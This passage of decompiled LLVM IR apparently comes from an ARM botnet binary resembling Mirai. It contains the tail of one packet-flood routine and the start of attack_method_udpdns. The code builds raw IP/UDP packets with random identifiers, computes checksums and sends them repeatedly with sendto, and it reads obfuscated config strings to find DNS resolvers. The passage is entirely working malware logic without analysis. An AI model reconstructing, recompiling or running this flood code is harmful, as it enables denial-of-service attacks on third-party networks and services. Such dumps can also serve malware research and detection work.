  %v1_a2a4 = and i32 %v3_a2a0, 65280
  %v0_a2a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_a2a8 = icmp eq i32 %v0_a2a8, 0
  store i1 %v2_a2a8, i1* %cpsr_z.global-to-local, align 1
  %v4_a2ac = udiv i32 %v0_a2a0, 16777216
  %v5_a2ac = or i32 %v1_a2a4, %v4_a2ac
  store i32 %v5_a2ac, i32* %ip.global-to-local, align 4
  %v2_a2b4 = load i32, i32* @lr, align 4
  %v3_a2b4 = add i32 %v2_a2b4, 9
  %v4_a2b4 = inttoptr i32 %v3_a2b4 to i8*
  store i8 17, i8* %v4_a2b4, align 1
  store i32 ptrtoint (i32* @global_var_243d4.57 to i32), i32* %r3.global-to-local, align 4
  %v0_a2bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a2bc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a218
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a2c0 = load i32, i32* @lr, align 4
  %v4_a2c0 = add i32 %v3_a2c0, 6
  %v5_a2c0 = inttoptr i32 %v4_a2c0 to i16*
  store i16 64, i16* %v5_a2c0, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a218, %bb
  %v2_a2c4 = load i32, i32* @global_var_243d4.57, align 4
  %v1_a2c8 = load i32, i32* @lr, align 4
  %v2_a2c8 = add i32 %v1_a2c8, 12
  %v3_a2c8 = inttoptr i32 %v2_a2c8 to i32*
  store i32 %v2_a2c4, i32* %v3_a2c8, align 4
  store i32 %v2_a234, i32* %r2.global-to-local, align 4
  %v1_a2d0 = add i32 %v2_a234, 16
  %v2_a2d0 = inttoptr i32 %v1_a2d0 to i32*
  %v3_a2d0 = load i32, i32* %v2_a2d0, align 4
  %v1_a2d4 = load i32, i32* @lr, align 4
  %v2_a2d4 = add i32 %v1_a2d4, 16
  %v3_a2d4 = inttoptr i32 %v2_a2d4 to i32*
  store i32 %v3_a2d0, i32* %v3_a2d4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_a2dc = load i32, i32* @lr, align 4
  %v1_a2dc = add i32 %v0_a2dc, 20
  store i32 %v1_a2dc, i32* %r4.global-to-local, align 4
  %v2_a2e0 = add i32 %v0_a2dc, 28
  %v3_a2e0 = inttoptr i32 %v2_a2e0 to i32*
  store i32 -1, i32* %v3_a2e0, align 4
  %v0_a2e4 = load i32, i32* @r5, align 4
  %v1_a2e4 = trunc i32 %v0_a2e4 to i16
  %v2_a2e4 = load i32, i32* @lr, align 4
  %v3_a2e4 = add i32 %v2_a2e4, 4
  %v4_a2e4 = inttoptr i32 %v3_a2e4 to i16*
  store i16 %v1_a2e4, i16* %v4_a2e4, align 2
  %v0_a2e8 = load i32, i32* @lr, align 4
  %v1_a2e8 = add i32 %v0_a2e8, 32
  %v0_a2ec = load i32, i32* %ip.global-to-local, align 4
  %v1_a2ec = trunc i32 %v0_a2ec to i16
  %v2_a2ec = load i32, i32* %r4.global-to-local, align 4
  %v3_a2ec = add i32 %v2_a2ec, 4
  %v4_a2ec = inttoptr i32 %v3_a2ec to i16*
  store i16 %v1_a2ec, i16* %v4_a2ec, align 2
  %v0_a2f0 = load i32, i32* @r7, align 4
  %v1_a2f0 = trunc i32 %v0_a2f0 to i16
  %v2_a2f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_a2f0 = add i32 %v2_a2f0, 2
  %v4_a2f0 = inttoptr i32 %v3_a2f0 to i16*
  store i16 %v1_a2f0, i16* %v4_a2f0, align 2
  %v0_a2f4 = load i32, i32* @r6, align 4
  %v1_a2f4 = trunc i32 %v0_a2f4 to i16
  %v2_a2f4 = load i32, i32* @lr, align 4
  %v3_a2f4 = add i32 %v2_a2f4, 20
  %v4_a2f4 = inttoptr i32 %v3_a2f4 to i16*
  store i16 %v1_a2f4, i16* %v4_a2f4, align 2
  %v3_a2f8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a2f8, i32* %r2.global-to-local, align 4
  %v3_a2fc = call i32 @util_memcpy(i32 %v1_a2e8, i32 %v3_a170, i32 %v3_a2f8)
  %v3_a300 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a300, i32* %r3.global-to-local, align 4
  %v1_a304 = add i32 %v3_a300, 1
  store i32 %v1_a304, i32* @r4, align 4
  %v1_a308 = load i32, i32* @r8, align 4
  %v9_a308 = icmp eq i32 %v1_a304, %v1_a308
  store i1 %v9_a308, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a304, i32* %stack_var_-44, align 4
  %v5_a310 = icmp slt i32 %v1_a304, %v1_a308
  br i1 %v5_a310, label %dec_label_pc_a218, label %dec_label_pc_a314.preheader

dec_label_pc_a314.preheader:                      ; preds = %.thread, %dec_label_pc_a1bc
  %v0_a318.ph = phi i32 [ 0, %dec_label_pc_a1bc ], [ %v1_a308, %.thread ]
  %v3_a354 = icmp eq i32 %v3_a1cc, 65535
  br label %dec_label_pc_a314

dec_label_pc_a314:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400, %dec_label_pc_a314.preheader
  %v0_a318 = phi i32 [ %v0_a318.ph, %dec_label_pc_a314.preheader ], [ 0, %dec_label_pc_a400 ], [ 0, %dec_label_pc_a314 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a318 = icmp eq i32 %v0_a318, 0
  store i1 %v2_a318, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a318, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a314, %dec_label_pc_a400
  br label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a324
  %v1_a338 = phi i32 [ %v1_a3f0, %dec_label_pc_a374 ], [ 0, %dec_label_pc_a324 ]
  %v5_a32c = mul i32 %v1_a338, 24
  %v1_a330 = load i32, i32* @sl, align 4
  %v2_a330 = add i32 %v1_a330, %v5_a32c
  store i32 %v2_a330, i32* %r3.global-to-local, align 4
  %v1_a334 = add i32 %v2_a330, 20
  %v2_a334 = inttoptr i32 %v1_a334 to i8*
  %v3_a334 = load i8, i8* %v2_a334, align 1
  %v4_a334 = zext i8 %v3_a334 to i32
  store i32 %v4_a334, i32* %r2.global-to-local, align 4
  %v0_a338 = load i32, i32* @fp, align 4
  %v4_a338 = mul i32 %v1_a338, 4
  %v5_a338 = add i32 %v0_a338, %v4_a338
  %v6_a338 = inttoptr i32 %v5_a338 to i32*
  %v7_a338 = load i32, i32* %v6_a338, align 4
  store i32 %v7_a338, i32* @r5, align 4
  %v7_a340 = icmp eq i8 %v3_a334, 31
  store i1 %v7_a340, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* @r7, align 4
  %v1_a348 = add i32 %v7_a338, 20
  store i32 %v1_a348, i32* @r6, align 4
  %tmp40 = icmp ult i8 %v3_a334, 32
  br i1 %tmp40, label %dec_label_pc_a414, label %dec_label_pc_a350

dec_label_pc_a350:                                ; preds = %dec_label_pc_a328
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  store i1 %v3_a354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a354, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a35c:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v1_a360 = phi i32 [ %v1_a46c, %dec_label_pc_a414 ], [ 65535, %dec_label_pc_a350 ]
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v9_a360 = icmp eq i32 %v3_a1d0, %v1_a360
  store i1 %v9_a360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a360, label %dec_label_pc_a488, label %dec_label_pc_a368

dec_label_pc_a368:                                ; preds = %dec_label_pc_a474.dec_label_pc_a368_crit_edge, %dec_label_pc_a35c
  %v1_a36c = phi i32 [ %v1_a36c.pre, %dec_label_pc_a474.dec_label_pc_a368_crit_edge ], [ %v1_a360, %dec_label_pc_a35c ]
  %v9_a36c = icmp eq i32 %v3_a1d4, %v1_a36c
  store i1 %v9_a36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a36c, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a374:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368, %dec_label_pc_a49c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_a378 = load i32, i32* @r5, align 4
  %v3_a378 = add i32 %v2_a378, 10
  %v4_a378 = inttoptr i32 %v3_a378 to i16*
  store i16 0, i16* %v4_a378, align 2
  %v0_a380 = load i32, i32* @r5, align 4
  store i32 %v0_a380, i32* @r0, align 4
  %v2_a384 = call i32 @checksum_generic(i32 %v0_a380, i32 20)
  %v3_a384 = trunc i32 %v2_a384 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a38c = load i32, i32* @r5, align 4
  %v4_a38c = add i32 %v3_a38c, 10
  %v5_a38c = inttoptr i32 %v4_a38c to i16*
  store i16 %v3_a384, i16* %v5_a38c, align 2
  %v0_a390 = load i32, i32* %r3.global-to-local, align 4
  %v1_a390 = trunc i32 %v0_a390 to i16
  %v2_a390 = load i32, i32* @r6, align 4
  %v3_a390 = add i32 %v2_a390, 6
  %v4_a390 = inttoptr i32 %v3_a390 to i16*
  store i16 %v1_a390, i16* %v4_a390, align 2
  %v3_a394 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a394, i32* %r3.global-to-local, align 4
  %v0_a398 = load i32, i32* @r6, align 4
  store i32 %v0_a398, i32* @r1, align 4
  %v1_a39c = add i32 %v0_a398, 4
  %v2_a39c = inttoptr i32 %v1_a39c to i16*
  %v3_a39c = load i16, i16* %v2_a39c, align 2
  %v4_a39c = zext i16 %v3_a39c to i32
  store i32 %v4_a39c, i32* %r2.global-to-local, align 4
  %v1_a3a0 = add i32 %v3_a394, 12
  store i32 %v1_a3a0, i32* %r3.global-to-local, align 4
  %v0_a3a4 = load i32, i32* @r5, align 4
  %v4_a3a8 = call i32 @checksum_tcpudp(i32 %v0_a3a4, i32 %v0_a398, i32 %v4_a39c, i32 %v1_a3a0)
  %v5_a3a8 = trunc i32 %v4_a3a8 to i16
  %v3_a3ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ac, i32* %r3.global-to-local, align 4
  %v3_a3b0 = mul i32 %v3_a3ac, 32
  store i32 %v3_a3b0, i32* %lr.global-to-local, align 4
  %v3_a3b4 = load i32, i32* @r6, align 4
  %v4_a3b4 = add i32 %v3_a3b4, 6
  %v5_a3b4 = inttoptr i32 %v4_a3b4 to i16*
  store i16 %v5_a3a8, i16* %v5_a3b4, align 2
  %v0_a3b8 = load i32, i32* %lr.global-to-local, align 4
  %v1_a3b8 = load i32, i32* %r3.global-to-local, align 4
  %tmp41 = mul i32 %v1_a3b8, -8
  %v5_a3b8 = add i32 %v0_a3b8, %tmp41
  store i32 %v5_a3b8, i32* %lr.global-to-local, align 4
  %v0_a3bc = load i32, i32* @r6, align 4
  %v1_a3bc = add i32 %v0_a3bc, 2
  %v2_a3bc = inttoptr i32 %v1_a3bc to i16*
  %v3_a3bc = load i16, i16* %v2_a3bc, align 2
  %v4_a3bc = zext i16 %v3_a3bc to i32
  store i32 %v4_a3bc, i32* @r6, align 4
  %v3_a3c0 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_a3c0, i32* %r2.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @sl, align 4
  %v2_a3c4 = add i32 %v1_a3c4, %v5_a3b8
  store i32 %v2_a3c4, i32* @lr, align 4
  %v3_a3c8 = add i32 %v2_a3c4, 2
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i16*
  store i16 %v3_a3bc, i16* %v4_a3c8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a3d4 = load i32, i32* @r5, align 4
  %v0_a3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a3d8 = add i32 %v0_a3d8, 32
  store i32 %v1_a3d8, i32* %r2.global-to-local, align 4
  %v0_a3dc = load i32, i32* @sb, align 4
  %v0_a3e0 = load i32, i32* @lr, align 4
  %v6_a3e8 = call i32 @__libc_sendto(i32 %v0_a3dc, i32 %v0_a3d4, i32 %v1_a3d8, i32 16384, i32 %v0_a3e0, i32 16)
  %v3_a3ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a3ec, i32* %r3.global-to-local, align 4
  %v1_a3f0 = add i32 %v3_a3ec, 1
  %v1_a3f4 = load i32, i32* @r8, align 4
  %v9_a3f4 = icmp eq i32 %v1_a3f0, %v1_a3f4
  store i1 %v9_a3f4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a3f0, i32* %stack_var_-44, align 4
  %v5_a3fc = icmp slt i32 %v1_a3f0, %v1_a3f4
  br i1 %v5_a3fc, label %dec_label_pc_a328, label %dec_label_pc_a400

dec_label_pc_a400:                                ; preds = %dec_label_pc_a374
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a404 = icmp eq i32 %v1_a3f4, 0
  store i1 %v2_a404, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a404, label %dec_label_pc_a314, label %dec_label_pc_a324

dec_label_pc_a414:                                ; preds = %dec_label_pc_a328
  %v1_a414 = add i32 %v2_a330, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* @r4, align 4
  %v0_a418 = call i32 @rand_next()
  %v3_a41c = load i32, i32* %stack_var_-44, align 4
  %v5_a424 = mul i32 %v3_a41c, 24
  %v0_a428 = load i32, i32* @r4, align 4
  %v1_a428 = and i32 %v0_a428, 16711680
  store i32 %v1_a428, i32* %ip.global-to-local, align 4
  %v3_a42c = udiv i32 %v0_a428, 16777216
  %v4_a430 = udiv i32 %v1_a428, 256
  %v5_a430 = or i32 %v4_a430, %v3_a42c
  store i32 %v5_a430, i32* %r2.global-to-local, align 4
  %v1_a434 = load i32, i32* @sl, align 4
  %v2_a434 = add i32 %v1_a434, %v5_a424
  %v1_a438 = and i32 %v0_a428, 65280
  store i32 %v1_a438, i32* %r3.global-to-local, align 4
  %v1_a43c = add i32 %v2_a434, 20
  %v2_a43c = inttoptr i32 %v1_a43c to i8*
  %v3_a43c = load i8, i8* %v2_a43c, align 1
  %v4_a43c = zext i8 %v3_a43c to i32
  store i32 %v4_a43c, i32* %ip.global-to-local, align 4
  %v5_a444 = call i32 @llvm.bswap.i32(i32 %v0_a428)
  %v7_a448 = lshr i32 %v0_a418, %v4_a43c
  %v8_a448 = add i32 %v7_a448, %v5_a444
  store i32 %v8_a448, i32* %r2.global-to-local, align 4
  %v5_a460 = call i32 @llvm.bswap.i32(i32 %v8_a448)
  %v1_a464 = load i32, i32* @r5, align 4
  %v2_a464 = add i32 %v1_a464, 16
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v5_a460, i32* %v3_a464, align 4
  store i32 %v3_a1cc, i32* %r3.global-to-local, align 4
  %v1_a46c = load i32, i32* @r7, align 4
  %v9_a46c = icmp eq i32 %v3_a1cc, %v1_a46c
  store i1 %v9_a46c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a46c, label %dec_label_pc_a474, label %dec_label_pc_a35c

dec_label_pc_a474:                                ; preds = %dec_label_pc_a414, %dec_label_pc_a350
  %v0_a474 = call i32 @rand_next()
  %v1_a474 = trunc i32 %v0_a474 to i16
  store i32 %v3_a1d0, i32* %ip.global-to-local, align 4
  %v1_a47c = load i32, i32* @r7, align 4
  %v9_a47c = icmp eq i32 %v3_a1d0, %v1_a47c
  store i1 %v9_a47c, i1* %cpsr_z.global-to-local, align 1
  %v3_a480 = load i32, i32* @r5, align 4
  %v4_a480 = add i32 %v3_a480, 4
  %v5_a480 = inttoptr i32 %v4_a480 to i16*
  store i16 %v1_a474, i16* %v5_a480, align 2
  br i1 %v9_a47c, label %dec_label_pc_a488, label %dec_label_pc_a474.dec_label_pc_a368_crit_edge

dec_label_pc_a474.dec_label_pc_a368_crit_edge:    ; preds = %dec_label_pc_a474
  %v1_a36c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a368

dec_label_pc_a488:                                ; preds = %dec_label_pc_a474, %dec_label_pc_a35c
  %v0_a488 = call i32 @rand_next()
  %v1_a488 = trunc i32 %v0_a488 to i16
  %v1_a490 = load i32, i32* @r7, align 4
  %v9_a490 = icmp eq i32 %v3_a1d4, %v1_a490
  store i1 %v9_a490, i1* %cpsr_z.global-to-local, align 1
  %v3_a494 = load i32, i32* @r5, align 4
  %v4_a494 = add i32 %v3_a494, 20
  %v5_a494 = inttoptr i32 %v4_a494 to i16*
  store i16 %v1_a488, i16* %v5_a494, align 2
  br i1 %v9_a490, label %dec_label_pc_a49c, label %dec_label_pc_a374

dec_label_pc_a49c:                                ; preds = %dec_label_pc_a488, %dec_label_pc_a368
  %v0_a49c = call i32 @rand_next()
  %v1_a49c = trunc i32 %v0_a49c to i16
  %v3_a4a0 = load i32, i32* @r6, align 4
  %v4_a4a0 = add i32 %v3_a4a0, 2
  %v5_a4a0 = inttoptr i32 %v4_a4a0 to i16*
  store i16 %v1_a49c, i16* %v5_a4a0, align 2
  br label %dec_label_pc_a374

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a194
  %v0_a4a8 = load i32, i32* @sb, align 4
  %v1_a4ac = call i32 @__GI___libc_close(i32 %v0_a4a8)
  br label %dec_label_pc_a4b0

dec_label_pc_a4b0:                                ; preds = %entry, %dec_label_pc_a4a8
  %v1_a4b8 = phi i32 [ %v3_a184, %entry ], [ %v1_a4ac, %dec_label_pc_a4a8 ]
  store i32 %v3_a088, i32* %r4.global-to-local, align 4
  store i32 %v27_a088, i32* %lr.global-to-local, align 4
  ret i32 %v1_a4b8

; uselistorder directives
  uselistorder i32 %v1_a46c, { 1, 0 }
  uselistorder i32 %v0_a428, { 1, 2, 0, 3 }
  uselistorder i32 %v1_a3f0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_a3b8, { 1, 0 }
  uselistorder i1 %v3_a354, { 1, 0 }
  uselistorder i32 %v1_a304, { 1, 0, 2, 3 }
  uselistorder i32 %v3_a26c, { 1, 0 }
  uselistorder i32 %v3_a204, { 1, 0 }
  uselistorder i32 %v3_a200, { 1, 0 }
  uselistorder i32 %v0_a1c4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a1c0, { 1, 0, 2 }
  uselistorder i32 %v0_a1bc, { 1, 0, 3, 2 }
  uselistorder i1 %v7_a1b4, { 1, 0 }
  uselistorder i1 %v7_a188, { 1, 0 }
  uselistorder i32 %v3_a184, { 1, 2, 3, 0 }
  uselistorder i32 %v1_a124, { 1, 0 }
  uselistorder i32 %v5_a0f8, { 1, 0 }
  uselistorder i32 %v5_a0bc, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a4b0, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a324, { 1, 0 }
  uselistorder label %dec_label_pc_a314, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_udpdns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_a4c0 = load i32, i32* @sb, align 4
  %v27_a4c0 = load i32, i32* @lr, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_a4e0 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_a4e4 = load i32, i32* @r5, align 4
  store i32 %v0_a4e4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a4f0 = load i32, i32* @r4, align 4
  store i32 %v0_a4f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_a4f8 = inttoptr i32 %v0_a4e4 to i32*
  %v6_a4f8 = call i32 @attack_get_opt_int(i32 %v0_a4f0, i32* %v5_a4f8, i32 2, i32 0)
  %v1_a504 = urem i32 %v6_a4f8, 256
  store i32 %v1_a504, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v0_a514 = load i32, i32* @r5, align 4
  store i32 %v0_a514, i32* %r1.global-to-local, align 4
  %v6_a51c = inttoptr i32 %v0_a514 to i32*
  %v7_a51c = call i32 @attack_get_opt_int(i32 %v0_a510, i32* %v6_a51c, i32 3, i32 65535)
  %v0_a520 = load i32, i32* @r5, align 4
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_a52c = load i32, i32* @r4, align 4
  store i32 %v0_a52c, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_a534 = inttoptr i32 %v0_a520 to i32*
  %v6_a534 = call i32 @attack_get_opt_int(i32 %v0_a52c, i32* %v5_a534, i32 4, i32 64)
  %v1_a53c = urem i32 %v6_a534, 256
  store i32 %v1_a53c, i32* %ip.global-to-local, align 4
  %v0_a540 = load i32, i32* @r5, align 4
  store i32 %v0_a540, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a54c = load i32, i32* @r4, align 4
  store i32 %v0_a54c, i32* %r0.global-to-local, align 4
  %v6_a554 = inttoptr i32 %v0_a540 to i32*
  %v7_a554 = call i32 @attack_get_opt_int(i32 %v0_a54c, i32* %v6_a554, i32 5, i32 0)
  %v1_a560 = urem i32 %v7_a554, 256
  store i32 %v1_a560, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a56c = load i32, i32* @r4, align 4
  store i32 %v0_a56c, i32* %r0.global-to-local, align 4
  %v0_a570 = load i32, i32* @r5, align 4
  store i32 %v0_a570, i32* %r1.global-to-local, align 4
  %v5_a578 = inttoptr i32 %v0_a570 to i32*
  %v6_a578 = call i32 @attack_get_opt_int(i32 %v0_a56c, i32* %v5_a578, i32 6, i32 65535)
  %v0_a57c = load i32, i32* @r5, align 4
  store i32 %v0_a57c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a588 = load i32, i32* @r4, align 4
  store i32 %v0_a588, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_a590 = inttoptr i32 %v0_a57c to i32*
  %v6_a590 = call i32 @attack_get_opt_int(i32 %v0_a588, i32* %v5_a590, i32 7, i32 53)
  %v0_a59c = load i32, i32* @r5, align 4
  store i32 %v0_a59c, i32* %r1.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r4, align 4
  store i32 %v0_a5a0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_a5ac = inttoptr i32 %v0_a59c to i32*
  %v6_a5ac = call i32 @attack_get_opt_int(i32 %v0_a5a0, i32* %v5_a5ac, i32 9, i32 65535)
  %v0_a5b0 = load i32, i32* @r5, align 4
  store i32 %v0_a5b0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_a5bc = load i32, i32* @r4, align 4
  store i32 %v0_a5bc, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v5_a5c4 = inttoptr i32 %v0_a5b0 to i32*
  %v6_a5c4 = call i32 @attack_get_opt_int(i32 %v0_a5bc, i32* %v5_a5c4, i32 0, i32 12)
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a5d0 = load i32, i32* @r5, align 4
  store i32 %v0_a5d0, i32* %r1.global-to-local, align 4
  store i32 %v6_a5c4, i32* %sb.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r4, align 4
  store i32 %v0_a5d8, i32* %r0.global-to-local, align 4
  %v4_a5dc = inttoptr i32 %v0_a5d0 to i32*
  %v5_a5dc = call i32 @attack_get_opt_str(i32 %v0_a5d8, i32* %v4_a5dc, i32 8, i32 0)
  store i32 %v5_a5dc, i32* @r7, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a5e8 = call i32 @table_unlock_val(i32 21)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v3_a5f4 = call i32 @table_retrieve_val(i32 21, i32* null)
  store i32 %v3_a5f4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_a5fc = call i32 @__libc_open(i32 %v3_a5f4, i32 0)
  store i32 %v2_a5fc, i32* @r4, align 4
  store i32 21, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @table_lock_val(i32 21)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  %v0_a60c = load i32, i32* @r4, align 4
  %v1_a60c = icmp slt i32 %v0_a60c, 0
  %v2_a60c = icmp eq i32 %v0_a60c, 0
  store i1 %v2_a60c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_a60c, label %dec_label_pc_ab04, label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %entry
  %v2_a618 = ptrtoint i32* %stack_var_-2124 to i32
  store i32 %v2_a618, i32* @sl, align 4
  store i32 2048, i32* @r2, align 4
  store i32 %v2_a618, i32* @r1, align 4
  store i32 %v0_a60c, i32* %r0.global-to-local, align 4
  %v1_a628 = call i32 @__libc_read(i32 %v0_a60c)
  store i32 %v1_a628, i32* @r5, align 4
  %v0_a630 = load i32, i32* @r4, align 4
  store i32 %v0_a630, i32* %r0.global-to-local, align 4
  %v1_a634 = call i32 @__GI___libc_close(i32 %v0_a630)
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a63c = call i32 @table_unlock_val(i32 22)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v3_a648 = call i32 @table_retrieve_val(i32 22, i32* null)
  %v0_a64c = load i32, i32* @r5, align 4
  store i32 %v0_a64c, i32* @r1, align 4
  store i32 %v3_a648, i32* %r2.global-to-local, align 4
  store i32 %v2_a618, i32* %r0.global-to-local, align 4
  %v3_a658 = bitcast i32* %stack_var_-2124 to i8*
  %v4_a658 = call i32 @util_stristr(i8* %v3_a658, i32 %v0_a64c, i32 %v3_a648)
  store i32 %v4_a658, i32* @r6, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v1_a664 = call i32 @table_lock_val(i32 22)
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  %v0_a668 = load i32, i32* @r6, align 4
  %v7_a668 = icmp eq i32 %v0_a668, -1
  store i1 %v7_a668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a668, label %dec_label_pc_ab04, label %dec_label_pc_a670

dec_label_pc_a670:                                ; preds = %dec_label_pc_a614
  %v0_a670 = load i32, i32* @r5, align 4
  %v9_a670 = icmp eq i32 %v0_a670, %v0_a668
  store i1 %v9_a670, i1* %cpsr_z.global-to-local, align 1
  %v7_a674 = icmp sgt i32 %v0_a670, %v0_a668
  br i1 %v7_a674, label %dec_label_pc_a678, label %dec_label_pc_ab04

dec_label_pc_a678:                                ; preds = %dec_label_pc_a670
  %v0_a678 = load i32, i32* @sl, align 4
  %v2_a678 = add i32 %v0_a678, %v0_a668
  store i32 %v2_a678, i32* %r2.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_a6a4 = add i32 %v0_a670, -1
  br label %dec_label_pc_a69c

dec_label_pc_a688:                                ; preds = %dec_label_pc_a6c4, %bb103
  %v9_a688 = icmp eq i32 %v1_a6a4, %v0_a690
  store i1 %v9_a688, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a688, label %dec_label_pc_a6d0, label %dec_label_pc_a690

dec_label_pc_a690:                                ; preds = %dec_label_pc_a6b4, %dec_label_pc_a688, %bb
